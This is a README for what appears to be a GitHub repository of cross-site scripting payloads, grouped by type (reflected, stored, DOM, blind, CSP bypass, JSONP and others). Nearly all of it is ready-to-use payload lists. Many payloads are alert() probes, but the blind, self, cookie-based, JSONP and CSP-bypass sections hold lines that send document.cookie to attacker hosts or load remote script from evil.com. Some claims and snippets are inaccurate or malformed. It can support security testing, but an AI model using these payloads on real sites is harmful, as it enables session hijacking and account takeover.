# XSS Payloads 

This repository is a comprehensive collection of **XSS (Cross-Site Scripting) Payloads** designed for educational, research, and penetration testing purposes. It includes payloads for various XSS attack types, ranging from common techniques to advanced exploitation methods. Security researchers, bug bounty hunters, and developers can utilize these payloads to test, identify, and mitigate XSS vulnerabilities effectively.

<div align="center">
      <a href="https://www.whatsapp.com/channel/0029Vb68FeRFnSzGNOZC3h3x"><img src="https://img.shields.io/static/v1?style=for-the-badge&amp;message=WhatsApp+Channel&amp;color=25D366&amp;logo=&amp;logoColor=FFFFFF&amp;label=" alt="WhatsApp Channel"></a>
  <a href="https://t.me/HackerSecure"><img src="https://img.shields.io/static/v1?style=for-the-badge&amp;message=Telegram+Channel&amp;color=24A1DE&amp;logo=&amp;logoColor=FFFFFF&amp;label=" alt="Telegram Channel"></a>
  <a href="https://www.linkedin.com/in/cybersecurity-pentester/"><img src="https://img.shields.io/static/v1?style=for-the-badge&amp;message=LinkedIn&amp;color=0A66C2&amp;logo=LinkedIn&amp;logoColor=FFFFFF&amp;label=" alt="LinkedIn"></a>
  <a href="https://linktr.ee/yogsec"><img src="https://img.shields.io/static/v1?style=for-the-badge&amp;message=LinkTree&amp;color=25D366&amp;logo=&amp;logoColor=FFFFFF&amp;label=" alt="WhatsApp Channel"></a>
  <a href="https://x.com/home"><img src="https://img.shields.io/static/v1?style=for-the-badge&amp;message=X&amp;color=000000&amp;logo=&amp;logoColor=FFFFFF&amp;label=" alt="Lichess"></a>
  <a href="mailto:abhinavsingwal@gmail.com?subject=Hi%20YogSec%20,%20nice%20to%20meet%20you!"><img alt="Email" src="https://img.shields.io/static/v1?style=for-the-badge&amp;message=Gmail&amp;color=EA4335&amp;logo=Gmail&amp;logoColor=FFFFFF&amp;label="></a>
  <a href="https://yogsec.github.io/yogsec/"><img src="https://img.shields.io/static/v1?style=for-the-badge&amp;message=Website&amp;color=FFFFC5&amp;logo=&amp;logoColor=FFFFFF&amp;label=" alt="Telegram Channel"></a>  
  
</div>

---

## 🧪 Types of XSS Payloads
This repository features payloads for the following XSS attack types:

### 🔹 Reflected XSS
- Occurs when untrusted data is included in the immediate response without proper validation.
- Payload Example: `<script>alert(1)</script>`

### 🔹 Stored XSS
- Occurs when malicious scripts are permanently stored on the server and executed when accessed.
- Payload Example: `<img src="x" onerror="alert(1)">`

### 🔹 DOM-Based XSS
- Exploits client-side JavaScript manipulation within the DOM.
- Payload Example: `document.write("<img src='x' onerror='alert(1)'>");`

### 🔹 Blind XSS
- Injects payloads in areas that execute later (e.g., admin panels, logs).
- Payload Example: `<svg onload=alert(1)>`

### 🔹 Self XSS
- Exploits users tricked into executing malicious code in their own browsers.
- Payload Example: `javascript:alert(document.cookie)`

### 🔹 Mutation XSS
- Exploits HTML parsers that automatically modify injected payloads.
- Payload Example: `<a href="javascript:alert(1)">Click me</a>`

### 🔹 Polyglot XSS
- Uses hybrid payloads that execute in multiple contexts (HTML, JavaScript, etc.).
- Payload Example: `"><img src=x onerror=alert(1)>`

### 🔹 Universal XSS (UXSS)
- Exploits browser vulnerabilities rather than web applications.
- Payload Example: Browser-specific exploits vary widely.

### 🔹 Attribute-Based XSS
- Injects payloads directly into HTML attributes.
- Payload Example: `<input value='" onfocus="alert(1)' autofocus>`

### 🔹 Cookie-Based XSS
- Exploits insecure cookies to deliver malicious scripts.
- Payload Example: `document.cookie="malicious=1"; alert(document.cookie);`

### 🔹 Post-Based XSS
- Exploits XSS payloads via HTTP POST requests.
- Payload Example: `<input type="text" value="<script>alert(1)</script>">`

### 🔹 JSON-Based XSS
- Injects malicious code into JSON responses processed by JavaScript.
- Payload Example: `{"name":"<script>alert(1)</script>"}`

### 🔹 WebSocket XSS
- Exploits insecure WebSocket connections to inject scripts.
- Payload Example: `ws.send('<script>alert(1)</script>')`

### 🔹 Indirect XSS
- Payloads that exploit third-party integrations to execute code.
- Payload Example: Using vulnerable API endpoints.

### 🔹 Iframe-Based XSS
- Uses iframes to deliver XSS payloads.
- Payload Example: `<iframe src="javascript:alert(1)"></iframe>`

### 🔹 PDF-Based XSS
- Injects JavaScript directly into PDF viewers.
- Payload Example: `/#whatever#javascript:alert(document.cookie)`

### 🔹 SVG-Based XSS
- Exploits SVG elements to trigger malicious code.
- Payload Example: `<svg><script>alert(1)</script></svg>`

### 🔹 Flash-Based XSS
- Targets Flash vulnerabilities (mainly legacy systems).
- Payload Example: Flash-specific exploits vary based on software version.

### 🔹 AJAX XSS
- Payloads designed to exploit AJAX requests.
- Payload Example: `$.get("/vuln", {data:"<script>alert(1)</script>"});`

### 🔹 CSP Bypass XSS
- Exploits misconfigured Content Security Policies.
- Payload Example: `<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">`

### 🔹 Canonical XSS
- Uses encoding techniques to bypass security filters.
- Payload Example: `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`

### 🔹 Event Handler XSS
- Executes payloads via JavaScript event handlers.
- Payload Example: `<img src=x onerror=alert(1)>`

### 🔹 JSONP XSS
- Targets insecure JSONP endpoints to execute payloads.
- Payload Example: `callback=<script>alert(1)</script>`

### 🔹 XHR-Based XSS
- Exploits XMLHttpRequest to deliver payloads.
- Payload Example: `xhr.open("GET", "javascript:alert(1)", true);`

---

## 📋 Reflected XSS Payloads

### Common Reflected XSS Payloads
- `<script>alert('XSS')</script>`
- `"><script>alert('XSS')</script>`
- `<img src=x onerror=alert('XSS')>`
- `<svg onload=alert('XSS')>`
- `<iframe src="javascript:alert('XSS')"></iframe>`
- `<body onload=alert('XSS')>`
- `<link rel="stylesheet" href="javascript:alert('XSS')">`
- `<a href="javascript:alert('XSS')">Click me</a>`
- `<input value="" onfocus="alert('XSS')">`
- `<div onmouseover="alert('XSS')">Hover me</div>`

### Advanced Reflected XSS Techniques
- `"><img src=x onerror=alert('XSS')>`
- `"><svg onload=alert('XSS')>`
- `<img src=1 onerror='alert("XSS")'>`
- `<svg><script>alert('XSS')</script>`
- `javascript:alert('XSS')`
- `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
- `<iframe src="javascript:alert('XSS')"></iframe>`
- `" onfocus="alert('XSS')" autofocus`
- `" onclick="alert('XSS')">Click me`
- `'><img src=x onerror=alert('XSS')>`

---

# Stored XSS Payloads

### Common Stored XSS Payloads
- `<script>alert('Stored XSS')</script>`
- `<img src=x onerror=alert('Stored XSS')>`
- `<svg onload=alert('Stored XSS')>`
- `<iframe src="javascript:alert('Stored XSS')"></iframe>`
- `<body onload=alert('Stored XSS')>`
- `<link rel="stylesheet" href="javascript:alert('Stored XSS')">`
- `<a href="javascript:alert('Stored XSS')">Click me</a>`
- `<input value="" onfocus="alert('Stored XSS')">`
- `<div onmouseover="alert('Stored XSS')">Hover me</div>`
- `<marquee onstart="alert('Stored XSS')">Scroll me</marquee>`

### Advanced Stored XSS Techniques
- `"><img src=x onerror=alert('Stored XSS')>`
- `"><svg onload=alert('Stored XSS')>`
- `<img src=1 onerror='alert("Stored XSS")'>`
- `<svg><script>alert('Stored XSS')</script>`
- `javascript:alert('Stored XSS')`
- `data:text/html;base64,PHNjcmlwdD5hbGVydCgnU3RvcmVkIFhTUycpPC9zY3JpcHQ+`
- `<iframe src="javascript:alert('Stored XSS')"></iframe>`
- `" onfocus="alert('Stored XSS')" autofocus`
- `" onclick="alert('Stored XSS')">Click me`
- `'><img src=x onerror=alert('Stored XSS')>`

---

# DOM-Based XSS Payloads

### Common DOM-Based XSS Payloads
- `#<script>alert('DOM XSS')</script>`
- `#<img src=x onerror=alert('DOM XSS')>`
- `#<svg onload=alert('DOM XSS')>`
- `#<iframe src="javascript:alert('DOM XSS')"></iframe>`
- `#<body onload=alert('DOM XSS')>`
- `#<link rel="stylesheet" href="javascript:alert('DOM XSS')">`
- `#<a href="javascript:alert('DOM XSS')">Click me</a>`
- `#<input value="" onfocus="alert('DOM XSS')">`
- `#<div onmouseover="alert('DOM XSS')">Hover me</div>`
- `#<marquee onstart="alert('DOM XSS')">Scroll me</marquee>`

### Advanced DOM-Based XSS Techniques
- `#"><img src=x onerror=alert('DOM XSS')>`
- `#"><svg onload=alert('DOM XSS')>`
- `#<img src=1 onerror='alert("DOM XSS")'>`
- `#<svg><script>alert('DOM XSS')</script>`
- `#javascript:alert('DOM XSS')`
- `#data:text/html;base64,PHNjcmlwdD5hbGVydCgnRE9NIFhTUycpPC9zY3JpcHQ+`
- `#<iframe src="javascript:alert('DOM XSS')"></iframe>`
- `#" onfocus="alert('DOM XSS')" autofocus`
- `#" onclick="alert('DOM XSS')">Click me`
- `#'><img src=x onerror=alert('DOM XSS')>`

---

# Blind XSS Payloads

### Common Blind XSS Payloads
- `<script src=https://your-burpcollaborator.com></script>`
- `"><script src=https://your-burpcollaborator.com></script>`
- `"><img src=x onerror=this.src='https://your-burpcollaborator.com'>`
- `"><iframe src="javascript:eval('dGhpcy5sb2NhdGlvbiA9ICdodHRwczovL3lvdXItYnVycGNvbGxhYm9yYXRvci5jb20nOw==')"></iframe>`
- `"><svg onload=eval(atob('YWxlcnQoJ0JsaW5kIFhTUycp'))>`
- `"><body onload="fetch('https://your-burpcollaborator.com')">`
- `"><link rel="stylesheet" href="https://your-burpcollaborator.com">`
- `"><a href="javascript:fetch('https://your-burpcollaborator.com')">Click me</a>`
- `"><input value="" onfocus="fetch('https://your-burpcollaborator.com')">`
- `"><div onmouseover="fetch('https://your-burpcollaborator.com')">Hover me</div>`

### Advanced Blind XSS Techniques
- `"><img src=x onerror=eval(atob('YWxlcnQoJ0JsaW5kIFhTUycp'))>`
- `"><svg onload="fetch('https://your-burpcollaborator.com')">`
- `"><iframe src="javascript:fetch('https://your-burpcollaborator.com')"></iframe>`
- `"><script>new Image().src='https://your-burpcollaborator.com?cookie='+document.cookie</script>`
- `"><img src=1 onerror="new Image().src='https://your-burpcollaborator.com?cookie='+document.cookie">`
- `"><img src=x onerror='fetch("https://your-burpcollaborator.com")'>`
- `"><iframe src="javascript:alert('Blind XSS')"></iframe>`
- `"><marquee onstart="fetch('https://your-burpcollaborator.com')">Scroll me</marquee>`
- `"><input value="" onfocus="fetch('https://your-burpcollaborator.com')">`
- `"><a href="javascript:fetch('https://your-burpcollaborator.com')">Click me</a>`

---

# Self XSS Payloads


### Common Self XSS Payloads
- `javascript:alert(document.cookie)`
- `<img src=x onerror=alert(document.cookie)>`
- `<svg onload=alert(document.cookie)>`
- `<iframe src="javascript:alert(document.cookie)"></iframe>`
- `<body onload="alert(document.cookie)">`
- `<a href="javascript:alert(document.cookie)">Click me</a>`
- `<input value="" onfocus="alert(document.cookie)">`
- `<div onmouseover="alert(document.cookie)">Hover me</div>`
- `<img src=x onerror="console.log(document.cookie)">`
- `<svg onload="console.log(document.cookie)">`

### Advanced Self XSS Techniques
- `javascript:fetch('https://evil.com?cookie='+document.cookie)`
- `<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">`
- `<iframe src="javascript:fetch('https://evil.com?cookie='+document.cookie)"></iframe>`
- `<svg onload="fetch('https://evil.com?cookie='+document.cookie)">`
- `<body onload="fetch('https://evil.com?cookie='+document.cookie)">`
- `<a href="javascript:fetch('https://evil.com?cookie='+document.cookie)">Click me</a>`
- `<input value="" onfocus="fetch('https://evil.com?cookie='+document.cookie)">`
- `<div onmouseover="fetch('https://evil.com?cookie='+document.cookie)">Hover me</div>`
- `<img src=x onerror="new Image().src='https://evil.com?cookie='+document.cookie">`
- `<svg onload="new Image().src='https://evil.com?cookie='+document.cookie">`

---

# Mutation XSS Payloads

Here are **200+ Mutation XSS Payloads** designed to bypass filters and mutate in the DOM:

### Common Mutation XSS Payloads
- `<img src=x oNerrOr=alert(1)>`
- `<scr<script>ipt>alert(1)</script>`
- `"><img src=x oNerrOr=alert(1)>`
- `<svg onload=alert(1)>`
- `"><svg onload=alert(1)>`
- `<b onmouseover=alert(1)>Hover me</b>`
- `<input value=""><img src=x oNerrOr=alert(1)>`
- `<iframe src="javascript:alert(1)"></iframe>`
- `"><iframe src="javascript:alert(1)"></iframe>`
- `<marquee onstart=alert(1)>Scroll me</marquee>`

### Advanced Mutation XSS Techniques
- `<img src=x onerror="javascript:alert(1)">`
- `<b onmouseover="alert(1)">Hover me</b>`
- `<svg><script>alert(1)</script>`
- `<a href="javascript:alert(1)">Click me</a>`
- `<iframe src="javascript:alert(1)"></iframe>`
- `"><marquee onstart="alert(1)">Scroll me</marquee>`
- `<svg><img src=x onerror="alert(1)"></svg>`
- `<input value=""><img src=x onerror="alert(1)">`
- `"><svg><script>alert(1)</script></svg>`
- `<b onmouseover="alert(1)">Hover me</b>`

---

# Polyglot XSS Payloads

### Common Polyglot XSS Payloads
- `<script src=//evil.com></script>`
- `">'><script>alert('XSS')</script>`
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<iframe src="javascript:alert(1)"></iframe>`
- `<body onload=alert(1)>`
- `<a href="javascript:alert(1)">Click me</a>`
- `<input value="" onfocus=alert(1)>`
- `<div onmouseover=alert(1)>Hover me</div>`
- `<marquee onstart=alert(1)>Scroll me</marquee>`

---

# Universal XSS (UXSS) Payloads

### Common Universal XSS Payloads
- `<script>window.open('javascript:alert(1)')</script>`
- `javascript:alert(1)//`
- `<iframe src='javascript:alert(1)'></iframe>`
- `<img src=x onerror=window.open('javascript:alert(1)')>`
- `<svg/onload=window.open('javascript:alert(1)')>`
- `javascript://%0Aalert(1)`
- `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;1&#41;`

---

# Attribute-Based XSS Payloads

### Common Attribute-Based XSS Payloads
- `<img src=x onerror=alert(1)>`
- `<input type="text" value="" onfocus=alert(1)>`
- `<div onmouseover=alert(1)>Hover me</div>`
- `<body onload=alert(1)>`
- `<a href="javascript:alert(1)">Click me</a>`
- `<marquee onstart=alert(1)>Scroll me</marquee>`
- `<form action="javascript:alert(1)">Submit</form>`
- `<video src="x" onerror=alert(1)></video>`
- `<button onclick=alert(1)>Click me</button>`
- `<link rel="stylesheet" href="javascript:alert(1)">`

---

# Cookie-Based XSS Payloads

### Common Cookie-Based XSS Payloads
- `<script>document.cookie="sessionid=abcd1234; path=/;"</script>`
- `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`
- `<img src="x" onerror="document.cookie='xss=1';alert(document.cookie)">`
- `<body onload="document.cookie='auth=admin'">`
- `<script>document.write('<img src="http://attacker.com/?c='+escape(document.cookie)+'">')</script>`
- `<script>new Image().src='https://attacker.com/log?cookie='+document.cookie;</script>`
- `<iframe src="javascript:alert(document.cookie)"></iframe>`
- `<svg/onload="alert(document.cookie)">`
- `<input type="hidden" value="" onfocus="alert(document.cookie)">`
- `<form action="javascript:alert(document.cookie)">Submit</form>`

---

# Post-Based XSS Payloads

### Common Post-Based XSS Payloads
- `username=<script>alert(1)</script>&password=1234`
- `name=John&comment=<img src=x onerror=alert('XSS')>`
- `email=test@example.com&feedback=<svg/onload=alert('XSS')>`
- `message=<iframe src=javascript:alert('XSS')></iframe>`
- `content=<a href="javascript:alert('XSS')">Click me</a>`
- `data=<div onmouseover=alert('XSS')>Hover me</div>`
- `search=<input type='text' value='' onfocus=alert('XSS')>`
- `phone=<marquee onstart=alert('XSS')>Scroll me</marquee>`
- `info=<form action="javascript:alert('XSS')">Submit</form>`
- `location=<video src=x onerror=alert('XSS')></video>`

---

# JSON-Based XSS Payloads

### Common JSON-Based XSS Payloads
```json
{
  "username": "<script>alert('XSS')</script>",
  "comment": "<img src=x onerror=alert('XSS')>",
  "email": "test@example.com",
  "feedback": "<svg/onload=alert('XSS')>",
  "message": "<iframe src=javascript:alert('XSS')></iframe>",
  "content": "<a href='javascript:alert('XSS')'>Click me</a>",
  "data": "<div onmouseover=alert('XSS')>Hover me</div>",
  "search": "<input type='text' value='' onfocus=alert('XSS')>",
  "phone": "<marquee onstart=alert('XSS')>Scroll me</marquee>",
  "info": "<form action='javascript:alert('XSS')'>Submit</form>",
  "location": "<video src=x onerror=alert('XSS')></video>"
}
```

---

# WebSocket XSS Payloads

### Common WebSocket XSS Payloads
```javascript
ws = new WebSocket('ws://victim.com/socket');
ws.onopen = function() {
    ws.send("<script>alert('XSS')</script>");
};

ws = new WebSocket('ws://victim.com/socket');
ws.onmessage = function(event) {
    eval(event.data); // Potential XSS if data is unsanitized
};

ws = new WebSocket('ws://victim.com/socket');
ws.onopen = function() {
    ws.send("{"key":"<img src=x onerror=alert('XSS')>")};
};

ws = new WebSocket('ws://victim.com/socket');
ws.onopen = function() {
    ws.send("{"payload":"<svg/onload=alert('XSS')>")};
};

ws = new WebSocket('ws://victim.com/socket');
ws.onopen = function() {
    ws.send("{"data":"<iframe src=javascript:alert('XSS')></iframe>")};
};
```

---

# Indirect XSS Payloads

### Common Indirect XSS Payloads
```html
<a href="javascript:alert('XSS')">Click Me</a>

<img src="http://attacker.com/evil.png" onerror="alert('XSS')">

<input value="" onfocus="alert('XSS')">

<iframe src="javascript:alert('XSS')"></iframe>

<svg><script>alert('XSS')</script></svg>

<body onload="alert('XSS')"></body>

<object data="javascript:alert('XSS')"></object>

<details open ontoggle="alert('XSS')"></details>

<marquee onstart="alert('XSS')">XSS Test</marquee>

<video src onerror="alert('XSS')"></video>
```

---

# Iframe-Based XSS Payloads

### Common Iframe-Based XSS Payloads
```html
<iframe src="javascript:alert('XSS')"></iframe>

<iframe srcdoc="<script>alert('XSS')</script>"></iframe>

<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="> </iframe>

<iframe src="//evil.com/xss.html"></iframe>

<iframe src="javascript:document.write('<img src=x onerror=alert(1)>')"></iframe>

<iframe src="javascript:parent.location='javascript:alert(1)'"> </iframe>

<iframe src="http://victim.com" onload="alert('XSS')"></iframe>

<iframe src="about:blank" onload="this.contentWindow.document.write('<img src=x onerror=alert(1)>')"></iframe>

<iframe src="javascript:alert(document.cookie)"></iframe>

<iframe srcdoc="<svg/onload=alert('XSS')>"></iframe>
```

---

# PDF-Based XSS Payloads

### Common PDF-Based XSS Payloads
```html
%PDF-1.5
1 0 obj
<< /OpenAction 2 0 R >>
endobj
2 0 obj
<< /S /JavaScript /JS (alert('XSS')) >>
endobj
xref
0 3
0000000000 65535 f 
0000000010 00000 n 
0000000079 00000 n 
trailer
<< /Root 1 0 R >>
startxref
118
%%EOF

%PDF-1.4
1 0 obj
<< /Type /Catalog /OpenAction 2 0 R >>
endobj
2 0 obj
<< /S /JavaScript /JS (alert('PDF XSS')) >>
endobj
xref
0 3
0000000000 65535 f 
0000000010 00000 n 
0000000079 00000 n 
trailer
<< /Root 1 0 R >>
startxref
118
%%EOF

%PDF-1.3
1 0 obj
<< /Type /Catalog /OpenAction 2 0 R >>
endobj
2 0 obj
<< /S /JavaScript /JS (alert(document.cookie)) >>
endobj
xref
0 3
0000000000 65535 f 
0000000010 00000 n 
0000000079 00000 n 
trailer
<< /Root 1 0 R >>
startxref
118
%%EOF
```

---

# SVG-Based XSS Payloads

### Common SVG-Based XSS Payloads
```html
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert('XSS')</script>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"></svg>

<svg><g onload="alert('XSS')"></g></svg>

<svg><a xlink:href="javascript:alert('XSS')">Click me</a></svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <animate attributeName="x" from="0" to="1" onbegin="alert('XSS')"></animate>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert('XSS')</script>
    </body>
  </foreignObject>
</svg>
```

---

# Flash-Based XSS Payloads

### Common Flash-Based XSS Payloads
```html
<embed src="http://vulnerable.com/xss.swf?alert('XSS')">

<object data="http://vulnerable.com/xss.swf?alert('XSS')"></object>

<object type="application/x-shockwave-flash" data="http://vulnerable.com/xss.swf">
  <param name="movie" value="http://vulnerable.com/xss.swf?alert('XSS')">
</object>

<embed src="data:application/x-shockwave-flash;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="/>

<object data="data:application/x-shockwave-flash;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=" type="application/x-shockwave-flash"></object>
```

---

# AJAX XSS Payloads

### Common AJAX XSS Payloads
```javascript
$.get("/vulnerable", {data: "<script>alert('XSS')</script>"});

$.post("/vulnerable", {data: "<img src='x' onerror='alert(1)'>"});

fetch('/vulnerable?data=<script>alert(1)</script>');

var xhr = new XMLHttpRequest();
xhr.open("GET", "/vulnerable?data=<svg onload=alert('XSS')>");
xhr.send();

jQuery.ajax({
  url: '/vulnerable',
  data: { input: '<script>alert(1)</script>' }
});
```

---

# CSP Bypass XSS Payloads

### Common CSP Bypass XSS Payloads
```html
<script src="//evil.com/xss.js"></script>

<script>fetch('https://evil.com/?c='+document.cookie)</script>

<script>eval('alert(1)')</script>

<script src=data:application/javascript;base64,YWxlcnQoMSk=></script>

<script>window['ale'+'rt'](1)</script>

<img src=x onerror=eval('ale'+'rt(1)')>

<script>setTimeout('alert(1)',0)</script>

<svg><script>alert`1`</script></svg>

<a href="javascript:alert(1)">Click me</a>

<iframe src="javascript:alert('XSS')"></iframe>
```

---

# Canonical XSS Payloads

### Common Canonical XSS Payloads
```html
<script>alert(1)</script>

<img src=x onerror=alert(1)>

<svg><script>alert(1)</script></svg>

<iframe src="javascript:alert('XSS')"></iframe>

<body onload=alert('XSS')>

<video><source onerror="alert('XSS')"></video>

<object data="javascript:alert('XSS')"></object>

<a href="javascript:alert(1)">Click me</a>

<marquee onstart=alert('XSS')></marquee>

<div style="animation-name:rotation" onanimationstart="alert('XSS')"></div>
```

---

# Event Handler XSS Payloads

### Common Event Handler XSS Payloads
```html
<button onclick="alert('XSS')">Click Me</button>

<img src=x onerror=alert(1)>

<body onload=alert('XSS')>

<marquee onstart=alert('XSS')></marquee>

<div onmouseover="alert('XSS')">Hover me</div>

<input type="text" value="Test" onfocus="alert('XSS')">

<a href="#" onmousedown="alert('XSS')">Down</a>

<form action="#" onsubmit="alert('XSS')">

<video><source onerror="alert('XSS')"></video>

<object data="javascript:alert('XSS')"></object>
```

---

# JSONP XSS Payloads

### Common JSONP XSS Payloads
```html
<script src="https://example.com/jsonp?callback=alert(1)"></script>

<script src="https://example.com/api?callback=console.log&data=<img src=x onerror=alert(1)>"></script>

<script src="https://example.com/?jsonp=alert(document.cookie)"></script>

<script>$.getScript('https://example.com/callback?data=<svg onload=alert(1)>')</script>

<script src="https://example.com/jsonp?callback=alert&data=<img src=x onerror=alert('XSS')>"></script>

<script src="https://example.com/api?cb=alert('XSS')"></script>

<script src="https://example.com/api?callback=alert&xss=<script>alert(1)<\/script>"></script>

<script src="https://example.com/jsonp?callback=fetch('https://attacker.com/?cookie='+document.cookie)"></script>

<script src="https://example.com/?callback=alert(document.domain)"></script>

<script src="https://example.com/api?jsonp=alert(1)"></script>
```

---

# XHR-Based XSS Payloads

### Common XHR-Based XSS Payloads
```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://example.com/api?data=<img src=x onerror=alert(1)>', true);
  xhr.send();
</script>

<script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://example.com/login', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('username=admin&password=<script>alert(1)</script>');
</script>

<script>
  fetch('https://example.com/api?data=<svg onload=alert(1)>')
    .then(response => response.text())
    .then(data => document.write(data));
</script>

<script>
  $.get('https://example.com/api?data=<img src=x onerror=alert(1)>');
</script>

<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://example.com/api?data='+encodeURIComponent("<script>alert('XSS')<\/script>"), true);
  xhr.send();
</script>

<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '/search?q=<img src=x onerror=alert(1)>', true);
  xhr.send();
</script>

<script>
  fetch('/api?callback=alert(1)')
    .then(response => response.text())
    .then(eval);
</script>

<script>
  $.ajax({
    url: 'https://example.com/api?data=<script>alert(1)</script>',
    success: function(data) {
      document.write(data);
    }
  });
</script>

<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://example.com/api?query=<img src=x onerror=alert(1)>', true);
  xhr.send();
</script>

<script>
  $.getJSON('https://example.com/api?callback=alert&data=<img src=x onerror=alert(1)>');
</script>
```
